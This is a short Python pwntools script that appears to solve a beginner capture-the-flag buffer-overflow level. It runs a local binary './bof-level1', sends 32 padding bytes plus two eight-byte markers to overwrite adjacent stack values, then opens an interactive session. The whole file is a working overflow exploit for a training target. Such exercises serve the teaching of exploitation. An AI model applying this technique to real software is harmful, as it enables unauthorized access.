#!/usr/bin/env python

from pwn import *

p = process("./bof-level1")

print(p.recv())

buff = "A" * 32
buff += "ABCDEFGH"
buff += "abcdefgh"

p.sendline(buff)

p.interactive()
